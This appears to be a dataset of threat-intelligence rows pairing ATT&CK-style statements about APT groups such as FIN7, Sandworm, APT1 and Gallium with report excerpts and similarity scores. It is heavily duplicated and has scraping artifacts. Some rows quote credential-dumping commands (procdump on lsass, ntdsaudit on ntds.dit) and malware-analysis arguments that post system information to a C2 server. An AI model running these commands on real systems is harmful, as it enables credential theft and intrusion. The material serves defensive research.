chimera has used custom dlls for continuous retrieval of data from memory.,[2].004application layer protocol:dnschimerahas usedcobalt striketo encapsulate c2 in dns traffic. [2]enterpriset1560.001archive collected data:archive via utilitychimerahas used gzip for linux os and a modified rar software to archive data on windows hosts.,[1][2]enterpriset1119automated collectionchimerahas used custom dlls for continuous retrieval of data from memory.,[2]enterpriset1217browser information discoverychimerahas usedtype \\\\\\\\c$\\\\users\\\\\\\\favorites\\\\links\\\\bookmarks bar\\\\imported from ie*citrix*for bookmark discovery. [2]enterpriset1110.003brute force:password sprayingchimerahas used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts.,66f56e113063d29485700430,2364,0.7152789857972932
"in preparation for its attack against the 2018 winter olympics, sandworm team conducted online research of partner organizations listed on an official pyeongchang olympics partnership site.",[1].003gather victim identity information:employee namessandworm team's research of potential victim organizations included the identification and collection of employee information. [1]enterpriset1590.001gather victim network information:domain propertiessandworm teamconducted technical reconnaissance of the parliament of georgia's official internet domain prior to its 2019 attack.,"[1]enterpriset1591.002gather victim org information:business relationshipsin preparation for its attack against the 2018 winter olympics,sandworm teamconducted online research of partner organizations listed on an official pyeongchang olympics partnership site.","[1]enterpriset1562.001impair defenses:disable or modify toolsduring the2015 ukraine electric power attack,sandworm teammodified in-registry internet settings to lower internet security. [14].002impair defenses:disable windows event loggingduring the2016 ukraine electric power attack,sandworm teamdisabled event logging on compromised systems.",66f56dc63063d2948570040d,1314,0.7952414954451202
sandworm team's research of potential victim organizations included the identification and collection of employee information.,"[1][17]enterpriset1592.002gather victim host information:softwaresandworm teamhas researched software code to enable supply-chain operations, most notably for the 2017notpetyaattack.sandworm teamalso collected a list of computers using specific software as part of its targeting efforts. [1]enterpriset1589.002gather victim identity information:email addressessandworm teamhas obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns.",[1].003gather victim identity information:employee namessandworm team's research of potential victim organizations included the identification and collection of employee information.,"[1]enterpriset1590.001gather victim network information:domain propertiessandworm teamconducted technical reconnaissance of the parliament of georgia's official internet domain prior to its 2019 attack. [1]enterpriset1591.002gather victim org information:business relationshipsin preparation for its attack against the 2018 winter olympics,sandworm teamconducted online research of partner organizations listed on an official pyeongchang olympics partnership site.",66f56dc63063d2948570040d,1312,0.7727706795346916
sandworm team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,[1][17]enterpriset1033system owner/user discoverysandworm teamhas collected the username from a compromised host. [1]enterpriset1199trusted relationshipsandworm teamhas used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.,[1]enterpriset1204.001user execution:malicious linksandworm teamhas tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.,"[1].002user execution:malicious filesandworm teamhas tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files. [21][1]during the2015 ukraine electric power attack,sandworm teamleveraged microsoft office attachments which contained malicious macros that were automatically executed once the user permitted them.",66f56dc63063d2948570040d,1377,0.7752535519501564
"chimera specifically has used the ntdsaudit tool to dump the password hashes of domain users via cmsadcs.exe ""ntds.dit"" -s ""system"" -p recordedtv_pdmp.txt --users-csv recordedtv_users.csv and used ntdsutil to copy the active directory database.","[1]enterpriset1588.002obtain capabilities:toolchimerahas obtained and used tools such asbloodhound,cobalt strike,mimikatz, andpsexec. [1][2]enterpriset1003.003os credential dumping:ntdschimerahas gathered the system registry and ntds.dit files from target systems.","[1]chimeraspecifically has used the ntdsaudit tool to dump the password hashes of domain users viamsadcs.exe ""ntds.dit"" -s ""system"" -p recordedtv_pdmp.txt --users-csv recordedtv_users.csvand used ntdsutil to copy the active directory database.",[2]enterpriset1201password policy discoverychimerahas used the ntdsaudit utility to collect information related to accounts and passwords. [2]enterpriset1069.001permission groups discovery:local groupschimerahas usednet localgroup administratorsto identify  accounts with local administrative rights.,66f56e113063d29485700430,2397,0.7959600523322963
sandworm team has used remote administration tools or remote industrial control system client software to maliciously release electricity breakers.,"[14]enterpriset1572protocol tunnelingduring the2022 ukraine electric power attack,sandworm teamdeployed the gogetter tunneler software to establish a ""yamux"" tls-based c2 channel with an external server(s). [19]enterpriset1090proxysandworm team's bcs-server tool can create an internal proxy server to redirect traffic from the adversary-controlled c2 to internal servers which may not be connected to the internet, but are interconnected locally.",[21]enterpriset1219remote access softwaresandworm teamhas used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers.,"[29][11]enterpriset1021.002remote services:smb/windows admin sharessandworm teamhas copied payloads to theadmin$share of remote systems and runnet useto connect to network shares. [17][11]during the2016 ukraine electric power attack,sandworm teamutilizednet useto connect to network shares.",66f56dc63063d2948570040d,1353,0.7566773097152915
it has also accessed network diagram files useful for understanding how a host's network was configured.,"[14]enterpriset1082system information discoverysandworm teamused a backdoor to enumerate information about the infected system's operating system. [22][1]enterpriset1049system network connections discoverysandworm teamhad gathered user, ip address, and server data related to rdp sessions on a compromised host.",it has also accessed network diagram files useful for understanding how a host's network was configured.,[1][17]enterpriset1033system owner/user discoverysandworm teamhas collected the username from a compromised host. [1]enterpriset1199trusted relationshipsandworm teamhas used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.,66f56dc63063d2948570040d,1374,1.0
apt1 used a batch script to perform a series of discovery techniques and saves it to a text file.,[1]enterpriset1583.001acquire infrastructure:domainsapt1has registered hundreds of domains for use in operations. [1]enterpriset1560.001archive collected data:archive via utilityapt1has used rar to compress files before moving them outside of the victim network.,[1]enterpriset1119automated collectionapt1used a batch script to perform a series of discovery techniques and saves it to a text file.,"[1]enterpriset1059.003command and scripting interpreter:windows command shellapt1has used the windows command shell to execute commands, and batch scripting to automate execution. [1]enterpriset1584.001compromise infrastructure:domainsapt1hijacked fqdns associated with legitimate websites hosted by hop points.",66f56f493063d294857004d6,1865,0.7249128357637661
"apt1 has created email accounts for later use in social engineering, phishing, and when registering domains.","[1].002email collection:remote email collectionapt1uses two utilities, getmail and mapiget, to steal email. mapiget steals email still on exchange servers that has not yet been archived.","[1]enterpriset1585.002establish accounts:email accountsapt1has created email accounts for later use in social engineering, phishing, and when registering domains.","[1]enterpriset1036.005masquerading:match legitimate name or locationthe file name acrord32.exe, a legitimate process name for adobe's acrobat reader, was used byapt1as a name for malware. [1][3]enterpriset1135network share discoveryapt1listed connected network shares.",66f56f493063d294857004d6,1873,0.7003912859207093
adversaries may abuse a valid kerberos ticket-granting ticket  or sniff network traffic to obtain a ticket-granting service  ticket that may be vulnerable to brute force.,"while the lsass process is always the target, threat actors use a variety of tools to get at the credentials within. these strategies can range from the use of third-party frameworks like cobalt strike (describedhere), or system utilities like the task manager, to administrative tools like sysinternals procdump.the report “bumblebee zeros in on meterpreter” contains an example of utilizing procdump for lsass dump:procdump64.exe -accepteula -ma lsass.exe c:\\\\programdata\\\\lsass.dmpthe use of a framework such as cobalt strike may be noticed inside the “dead or alive an emotet story” report:eventid: 10
 sourceimage: c:\\\\windows\\\\system32\\\\searchindexer.exe
 targetimage: c:\\\\windows\\\\system32\\\\lsass.exe
 grantedaccess: 136208
 calltrace:
 c:\\\\windows\\\\system32\\\\ntdll.dll+9d1e4|c:\\\\windows\\\\system32\\\\kernelbase.dll+2bcbe|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+10369|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+10b65|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+8cb2|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+53c9|c:\\\\windows\\\\system32\\\\kernel32.dll+17034|c:\\\\windows\\\\system32\\\\ntdll.dll+52651the kerberoasting technique can be used to target and crack weak passwords of service accounts.",threat actors utilize a valid kerberos ticket-granting ticket (tgt) to request a valid ticket-granting service (tgs) ticket.,"with this ticket the threat actors can try various offline brute forcing tools to crack the service account password. if cracked, these service accounts may have more privileged access allowing the threat actors to escalate their privileges in an enterprise network.the report “dead or alive an emotet story” showcased this technique:in this specific instance, we can see how thepowersploitframework’sinvoke-kerberoastutility is being used.upon initial access, threat actors use discovery techniques to gain an understanding of the environment in which they have accessed.",66f56eba3063d29485700490,251,0.7749674512401387
adversaries possessing a valid kerberos ticket-granting ticket  may request one or more kerberos ticket-granting service  service tickets for any spn from a domain controller .,"while the lsass process is always the target, threat actors use a variety of tools to get at the credentials within. these strategies can range from the use of third-party frameworks like cobalt strike (describedhere), or system utilities like the task manager, to administrative tools like sysinternals procdump.the report “bumblebee zeros in on meterpreter” contains an example of utilizing procdump for lsass dump:procdump64.exe -accepteula -ma lsass.exe c:\\\\programdata\\\\lsass.dmpthe use of a framework such as cobalt strike may be noticed inside the “dead or alive an emotet story” report:eventid: 10
 sourceimage: c:\\\\windows\\\\system32\\\\searchindexer.exe
 targetimage: c:\\\\windows\\\\system32\\\\lsass.exe
 grantedaccess: 136208
 calltrace:
 c:\\\\windows\\\\system32\\\\ntdll.dll+9d1e4|c:\\\\windows\\\\system32\\\\kernelbase.dll+2bcbe|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+10369|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+10b65|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+8cb2|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+53c9|c:\\\\windows\\\\system32\\\\kernel32.dll+17034|c:\\\\windows\\\\system32\\\\ntdll.dll+52651the kerberoasting technique can be used to target and crack weak passwords of service accounts.",threat actors utilize a valid kerberos ticket-granting ticket (tgt) to request a valid ticket-granting service (tgs) ticket.,"with this ticket the threat actors can try various offline brute forcing tools to crack the service account password. if cracked, these service accounts may have more privileged access allowing the threat actors to escalate their privileges in an enterprise network.the report “dead or alive an emotet story” showcased this technique:in this specific instance, we can see how thepowersploitframework’sinvoke-kerberoastutility is being used.upon initial access, threat actors use discovery techniques to gain an understanding of the environment in which they have accessed.",66f56eba3063d29485700490,251,0.7307430242695538
getmail extracts emails from archived outlook .pst files.,"[1]enterpriset1005data from local systemapt1has collected files from a local victim. [1]enterpriset1114.001email collection:local email collectionapt1uses two utilities, getmail and mapiget, to steal email.",getmail extracts emails from archived outlook .pst files.,"[1].002email collection:remote email collectionapt1uses two utilities, getmail and mapiget, to steal email. mapiget steals email still on exchange servers that has not yet been archived.",66f56f493063d294857004d6,1870,1.0000000000000002
machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f56fb53063d29485700519,4199,0.713618643600507
machete employed some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f56fb53063d29485700519,4199,0.7859452648688388
gallium used dumped hashes to authenticate to other machines via pass the hash.,"the most common credential stealing tool used by the threat actor was a modifiedmimikatzthat dumps ntlm hashes. this version of mimikatz did not require any command line arguments, most likely in an attempt to avoid detection based on command-line auditing.",the dumped hashes were used to authenticate to other machines via pass the hash.,"we renamed this sample tomaybemimi.exe.modified mimikatz that dumps ntlm hashes.reverse engineering shows the similarity between maybemimi.exe and mimikatz.mimikatz code fromgithub.maybemimi strings.dumping the sam hive from the registryin order to obtain credentials, the threat actor used another technique that can be seen in the below screenshots. they dumped specific hivesfrom thewindows registry, such as the sam hive, which contains password hashes.reg.exe is being spawned from a shell process.command-line arguments indicate sam hive dumping.lateral movementonce the threat actor mapped the network and obtained credentials (through net use), they began to move laterally.",66f56ece3063d29485700498,569,0.8949897137177771
bronze butler has created forged kerberos ticket granting ticket  and ticket granting service  tickets to maintain administrative access.,"while the lsass process is always the target, threat actors use a variety of tools to get at the credentials within. these strategies can range from the use of third-party frameworks like cobalt strike (describedhere), or system utilities like the task manager, to administrative tools like sysinternals procdump.the report “bumblebee zeros in on meterpreter” contains an example of utilizing procdump for lsass dump:procdump64.exe -accepteula -ma lsass.exe c:\\\\programdata\\\\lsass.dmpthe use of a framework such as cobalt strike may be noticed inside the “dead or alive an emotet story” report:eventid: 10
 sourceimage: c:\\\\windows\\\\system32\\\\searchindexer.exe
 targetimage: c:\\\\windows\\\\system32\\\\lsass.exe
 grantedaccess: 136208
 calltrace:
 c:\\\\windows\\\\system32\\\\ntdll.dll+9d1e4|c:\\\\windows\\\\system32\\\\kernelbase.dll+2bcbe|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+10369|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+10b65|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+8cb2|c:\\\\program files\\\\common files\\\\microsoft shared\\\\ink\\\\ipsplugin.dll+53c9|c:\\\\windows\\\\system32\\\\kernel32.dll+17034|c:\\\\windows\\\\system32\\\\ntdll.dll+52651the kerberoasting technique can be used to target and crack weak passwords of service accounts.",threat actors utilize a valid kerberos ticket-granting ticket (tgt) to request a valid ticket-granting service (tgs) ticket.,"with this ticket the threat actors can try various offline brute forcing tools to crack the service account password. if cracked, these service accounts may have more privileged access allowing the threat actors to escalate their privileges in an enterprise network.the report “dead or alive an emotet story” showcased this technique:in this specific instance, we can see how thepowersploitframework’sinvoke-kerberoastutility is being used.upon initial access, threat actors use discovery techniques to gain an understanding of the environment in which they have accessed.",66f56eba3063d29485700490,251,0.707589282260877
mapiget steals email still on exchange servers that has not yet been archived.,"getmail extracts emails from archived outlook .pst files. [1].002email collection:remote email collectionapt1uses two utilities, getmail and mapiget, to steal email.",mapiget steals email still on exchange servers that has not yet been archived.,"[1]enterpriset1585.002establish accounts:email accountsapt1has created email accounts for later use in social engineering, phishing, and when registering domains. [1]enterpriset1036.005masquerading:match legitimate name or locationthe file name acrord32.exe, a legitimate process name for adobe's acrobat reader, was used byapt1as a name for malware.",66f56f493063d294857004d6,1872,1.0000000000000002
apt1 used a batch script to perform a series of discovery techniques and saves it to a text file.,[1]enterpriset1583.001acquire infrastructure:domainsapt1has registered hundreds of domains for use in operations. [1]enterpriset1560.001archive collected data:archive via utilityapt1has used rar to compress files before moving them outside of the victim network.,[1]enterpriset1119automated collectionapt1used a batch script to perform a series of discovery techniques and saves it to a text file.,"[1]enterpriset1059.003command and scripting interpreter:windows command shellapt1has used the windows command shell to execute commands, and batch scripting to automate execution. [1]enterpriset1584.001compromise infrastructure:domainsapt1hijacked fqdns associated with legitimate websites hosted by hop points.",66f56f493063d294857004d6,1865,0.7249128357637661
machete has also used some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.,spear only observed this activity over the usual tcp port 21. the samples would also test connectivity to the c2 via http requests using python’s urllib library. an example request is shown below.get / http/1.0host: idrt.gotdns.chuser-agent: python-urllib/1.17figure 1: sample connectivity requestthe scripts themselves could be easily extracted and decompiled out of the binaries usinguncompyle.,"the decompiled scripts employed some visual obfuscation techniques by naming variables as combinations of the characters ‘o’, ‘o’, and ‘0’ to hinder analysis.","one of the external modules was designed to find, encrypt, and upload files from fixed and removable drives using a predefined list of extensions; perhaps most interesting in this list was the inclusion of several graphical information systems file formats (gis), as well as pgp/ gpg files and private key rings. in-depth analysis of the scripts showed the group employed aes in cbc mode using a predefined static key to encrypt files before uploading them to the c2 server.",66f56fb53063d29485700519,4199,0.713618643600507
mapiget steals email still on exchange servers that has not yet been archived.,"getmail extracts emails from archived outlook .pst files. [1].002email collection:remote email collectionapt1uses two utilities, getmail and mapiget, to steal email.",mapiget steals email still on exchange servers that has not yet been archived.,"[1]enterpriset1585.002establish accounts:email accountsapt1has created email accounts for later use in social engineering, phishing, and when registering domains. [1]enterpriset1036.005masquerading:match legitimate name or locationthe file name acrord32.exe, a legitimate process name for adobe's acrobat reader, was used byapt1as a name for malware.",66f56f493063d294857004d6,1872,1.0000000000000002
fin7 has encrypted virtual disk volumes on esxi servers using a version of darkside ransomware.,[4][12][5].007javascriptfin7used javascript scripts to help perform tasks on the victim's machine. [4][12][4]enterpriset1543.003create or modify system process:windows servicefin7created new windows services and added them to the startup directories for persistence.,[4]enterpriset1486data encrypted for impactfin7has encrypted virtual disk volumes on esxi servers using a version of darkside ransomware.,"[5][6]enterpriset1005data from local systemfin7has collected files and other sensitive information from a compromised network. [5]enterpriset1587.001develop capabilities:malwarefin7has developed malware for use in operations, including the creation of infected removable media.",66f570af3063d2948570059c,4322,0.7712651586246477
fin7's harpy backdoor malware can use dns as a backup channel for c2 if http fails.,[5]enterpriset1190exploit public-facing applicationfin7has compromised targeted organizations through exploitation of cve-2021-31207 in exchange. [9]enterpriset1210exploitation of remote servicesfin7has exploited zerologon (cve-2020-1472) against vulnerable domain controllers.,[5]enterpriset1008fallback channelsfin7's harpy backdoor malware can use dns as a backup channel for c2 if http fails.,"[17]enterpriset1105ingress tool transferfin7has downloaded additional malware to execute on the victim's machine, including by using a powershell script to launch shellcode that retrieves an additional payload. [2][18][6]enterpriset1559.002inter-process communication:dynamic data exchangefin7spear phishing campaigns have included malicious word documents with dde execution.",66f570af3063d2948570059c,4329,0.7612338028848022
carbanak’s harpy backdoor malware can use dns as a backup channel for c2 if http fails.,[5]enterpriset1190exploit public-facing applicationfin7has compromised targeted organizations through exploitation of cve-2021-31207 in exchange. [9]enterpriset1210exploitation of remote servicesfin7has exploited zerologon (cve-2020-1472) against vulnerable domain controllers.,[5]enterpriset1008fallback channelsfin7's harpy backdoor malware can use dns as a backup channel for c2 if http fails.,"[17]enterpriset1105ingress tool transferfin7has downloaded additional malware to execute on the victim's machine, including by using a powershell script to launch shellcode that retrieves an additional payload. [2][18][6]enterpriset1559.002inter-process communication:dynamic data exchangefin7spear phishing campaigns have included malicious word documents with dde execution.",66f570af3063d2948570059c,4329,0.7553187595112345
"fin7 has downloaded additional malware to execute on the victim's machine, including by using a powershell script to launch shellcode that retrieves an additional payload.",[9]enterpriset1210exploitation of remote servicesfin7has exploited zerologon (cve-2020-1472) against vulnerable domain controllers. [5]enterpriset1008fallback channelsfin7's harpy backdoor malware can use dns as a backup channel for c2 if http fails.,"[17]enterpriset1105ingress tool transferfin7has downloaded additional malware to execute on the victim's machine, including by using a powershell script to launch shellcode that retrieves an additional payload.","[2][18][6]enterpriset1559.002inter-process communication:dynamic data exchangefin7spear phishing campaigns have included malicious word documents with dde execution. [19]enterpriset1036.004masquerading:masquerade task or servicefin7has created a scheduled task named ""adobeflashsync"" to establish persistence.",66f570af3063d2948570059c,4330,0.7256782380267273
fin7 lured victims to double-click on images in the attachments they sent which would then execute the hidden lnk file.,[6]enterpriset1033system owner/user discoveryfin7has used the commandcmd.exe /c quserto collect user session information. [6]enterpriset1204.001user execution:malicious linkfin7has used malicious links to lure victims into downloading malware.,[5].002user execution:malicious filefin7lured victims to double-click on images in the attachments they sent which would then execute the hidden lnk file.,[2][11][5]enterpriset1078valid accountsfin7has harvested valid administrative credentials for lateral movement. [5].003local accountsfin7has used compromised credentials for access as system on exchange servers.,66f570af3063d2948570059c,4357,0.7093712107969702
"fin7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during c2.","[19]enterpriset1036.004masquerading:masquerade task or servicefin7has created a scheduled task named ""adobeflashsync"" to establish persistence. [13].005masquerading:match legitimate name or locationfin7has attempted to run darkside ransomware with the filename sleep.exe.","[5]enterpriset1571non-standard portfin7has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during c2.","[4]enterpriset1027.001obfuscated files or information:binary paddingfin7has used random junk code to obfuscate malware code. [6].010obfuscated files or information:command obfuscationfin7has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.",66f570af3063d2948570059c,4334,0.7788088215892445
"fin7 has used fragmented strings, environment variables, standard input , and native character-replacement functionalities to obfuscate commands.","[5]enterpriset1571non-standard portfin7has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during c2. [4]enterpriset1027.001obfuscated files or information:binary paddingfin7has used random junk code to obfuscate malware code.","[6].010obfuscated files or information:command obfuscationfin7has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.","[20][4][5]enterpriset1588.002obtain capabilities:toolfin7has utilized a variety of tools such ascobalt strike,powersploit, and the remote management tool, atera for targeting efforts. [6]enterpriset1069.002permission groups discovery:domain groupsfin7has used the commandnet group ""domain admins"" /domainto enumerate domain groups.",66f570af3063d2948570059c,4336,0.7534321013711566
carbanak checks the registry key hkcu\\software\\microsoft\\windows\\currentversion\\internet settings for proxy configurations information.,"]netlibrelogout.exe""mozilla/5.0 (windows nt 6.1; wow64; rv:27.0) firefox/27.0""after the configuration variables we found the main routine. first, the malware extracts its proxy information from the registry key.",hkcu\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\internet settings.,"it then saves the following information:proxyserver (proxy server address)proxyuser (proxy username)proxypass (proxy password)next, it gets the name of the computer and generates a unique id. once done, it calls  the systeminfo utility and saves the whole output to a text file that in our case called ohjlkad.txt:figure 20. initial data collection codeafter that, it waits for 40 seconds using the command:once the timer ends, it will check for the internet connection by launching a ping command and sending 14 requests to google.comonce finished, it kills the task with the filename stated in the configuration (“librelogout.exe”) and deletes the file.finally, it calls the config.exe application to provide several arguments:--user-agent = [hardcoded ua]--post-data=”versiya=wrarcomp=%computername%id=[generated from computer name]sysinfo=[data from ohjlkad.txt]”“[c2 server]”-q -n “[c2 server]”-o “librelogout.exe”in case the user is connected to the internet via proxy, it will provide additional arguments to config.exe:-e--http_proxy=http://[proxy server]--proxy-user=[proxy username]--proxy-password=[proxy password]among the arguments, we see one interesting parameter: versiya = wrar.",66f5707c3063d29485700587,3922,0.7000612264161327
fin7 created a custom video recording capability that could be used to monitor operations in the victim's environment.,[2][11][5]enterpriset1078valid accountsfin7has harvested valid administrative credentials for lateral movement. [5].003local accountsfin7has used compromised credentials for access as system on exchange servers.,[9]enterpriset1125video capturefin7created a custom video recording capability that could be used to monitor operations in the victim's environment.,"[4][18]enterpriset1497.002virtualization/sandbox evasion:user activity based checksfin7used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes. [2]enterpriset1102.002web service:bidirectional communicationfin7used legitimate services like google docs, google scripts, and pastebin for c2.",66f570af3063d2948570059c,4360,0.7244563298322122
fin7 has encrypted virtual disk volumes on esxi servers using a version of darkside ransomware.,[4][12][5].007javascriptfin7used javascript scripts to help perform tasks on the victim's machine. [4][12][4]enterpriset1543.003create or modify system process:windows servicefin7created new windows services and added them to the startup directories for persistence.,[4]enterpriset1486data encrypted for impactfin7has encrypted virtual disk volumes on esxi servers using a version of darkside ransomware.,"[5][6]enterpriset1005data from local systemfin7has collected files and other sensitive information from a compromised network. [5]enterpriset1587.001develop capabilities:malwarefin7has developed malware for use in operations, including the creation of infected removable media.",66f570af3063d2948570059c,4322,0.7712651586246477
fin7's harpy backdoor malware can use dns as a backup channel for c2 if http fails.,[5]enterpriset1190exploit public-facing applicationfin7has compromised targeted organizations through exploitation of cve-2021-31207 in exchange. [9]enterpriset1210exploitation of remote servicesfin7has exploited zerologon (cve-2020-1472) against vulnerable domain controllers.,[5]enterpriset1008fallback channelsfin7's harpy backdoor malware can use dns as a backup channel for c2 if http fails.,"[17]enterpriset1105ingress tool transferfin7has downloaded additional malware to execute on the victim's machine, including by using a powershell script to launch shellcode that retrieves an additional payload. [2][18][6]enterpriset1559.002inter-process communication:dynamic data exchangefin7spear phishing campaigns have included malicious word documents with dde execution.",66f570af3063d2948570059c,4329,0.7612338028848022
"fin7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during c2.","[19]enterpriset1036.004masquerading:masquerade task or servicefin7has created a scheduled task named ""adobeflashsync"" to establish persistence. [13].005masquerading:match legitimate name or locationfin7has attempted to run darkside ransomware with the filename sleep.exe.","[5]enterpriset1571non-standard portfin7has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during c2.","[4]enterpriset1027.001obfuscated files or information:binary paddingfin7has used random junk code to obfuscate malware code. [6].010obfuscated files or information:command obfuscationfin7has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.",66f570af3063d2948570059c,4334,0.7788088215892445
"gallium collected data from the victim's local system, including password hashes from the sam hive in the registry.",[1].003command and scripting interpreter:windows command shellgalliumused the windows command shell to execute commands. [1]enterpriset1136.002create account:domain accountgalliumcreated high-privileged domain user accounts to maintain access to victim networks.,"[1][2]enterpriset1005data from local systemgalliumcollected data from the victim's local system, including password hashes from the sam hive in the registry.",[1]enterpriset1074.001data staged:local data staginggalliumcompressed and staged files in multi-part archives in the recycle bin prior to exfiltration. [1]enterpriset1041exfiltration over c2 channelgalliumused web shells andhtranfor c2 and to exfiltrate data.,66f5719d3063d29485700622,4257,0.7493272386754989
gallium exploited a publicly-facing servers including wildfly/jboss servers to gain access to the network.,[1]enterpriset1074.001data staged:local data staginggalliumcompressed and staged files in multi-part archives in the recycle bin prior to exfiltration. [1]enterpriset1041exfiltration over c2 channelgalliumused web shells andhtranfor c2 and to exfiltrate data.,[1]enterpriset1190exploit public-facing applicationgalliumexploited a publicly-facing servers including wildfly/jboss servers to gain access to the network.,"[1][2]enterpriset1133external remote servicesgalliumhas used vpn services, including softether vpn, to access and maintain persistence in victim environments. [1][2]enterpriset1574.002hijack execution flow:dll side-loadinggalliumused dll side-loading to covertly loadpoisonivyinto memory on the victim machine.",66f5719d3063d29485700622,4260,0.7447092315269386
"gallium has used vpn services, including softether vpn, to access and maintain persistence in victim environments.",[1]enterpriset1041exfiltration over c2 channelgalliumused web shells andhtranfor c2 and to exfiltrate data. [1]enterpriset1190exploit public-facing applicationgalliumexploited a publicly-facing servers including wildfly/jboss servers to gain access to the network.,"[1][2]enterpriset1133external remote servicesgalliumhas used vpn services, including softether vpn, to access and maintain persistence in victim environments.","[1][2]enterpriset1574.002hijack execution flow:dll side-loadinggalliumused dll side-loading to covertly loadpoisonivyinto memory on the victim machine. [1]enterpriset1105ingress tool transfergalliumdropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, andhtran.",66f5719d3063d29485700622,4261,0.7823847457505176
some strings in homefry are obfuscated with xor x56.,"temp.periscope overlaps in targeting, as well as tactics, techniques, and procedures (ttps), with temp.jumper, a group that also overlaps significantly with public reporting on “nanhaishu.”ttps and malware usedin their recent spike in activity, temp.periscope has leveraged a relatively large library of malware shared with multiple other suspected chinese groups. these tools include:airbreak: a javascript-based backdoor also reported as “orz” that retrieves commands from hidden strings in compromised webpages and actor controlled profiles on legitimate services.badflick: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (c2) configuration.photo: a dll backdoor also reported publicly as “derusbi”, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files.homefry: a 64-bit windows password dumper/cracker that has previously been used in conjunction with airbreak and badflick backdoors.",some strings are obfuscated with xor x56.,"the malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, ntlm hashes, and malware version for each login session.lunchmoney: an uploader that can exfiltrate files to dropbox.murkytop: a command-line reconnaissance tool. it can be used to execute files as a different user, move, and delete files locally, schedule remote at jobs, perform host discovery on connected networks, scan for open ports on hosts in a connected network, and retrieve information about the os, users, groups, and shares on remote hosts.china chopper: a simple code injection webshell that executes microsoft .net code within http post commands.",66f571813063d29485700617,4055,0.8550033212865458
the group also ran a modified version of nbtscan to identify available netbios name servers.,[1][2]enterpriset1553.002subvert trust controls:code signinggalliumhas used stolen certificates to sign its tools including those from whizzimo llc. [2]enterpriset1016system network configuration discoverygalliumusedipconfig /allto obtain information about the victim network configuration.,the group also ran a modified version ofnbtscanto identify available netbios name servers.,[1]enterpriset1049system network connections discoverygalliumusednetstat -oanto obtain information about the victim network connections. [1]enterpriset1033system owner/user discoverygalliumusedwhoamiandquery userto obtain information about the victim user.,66f5719d3063d29485700622,4278,0.7896793225281422
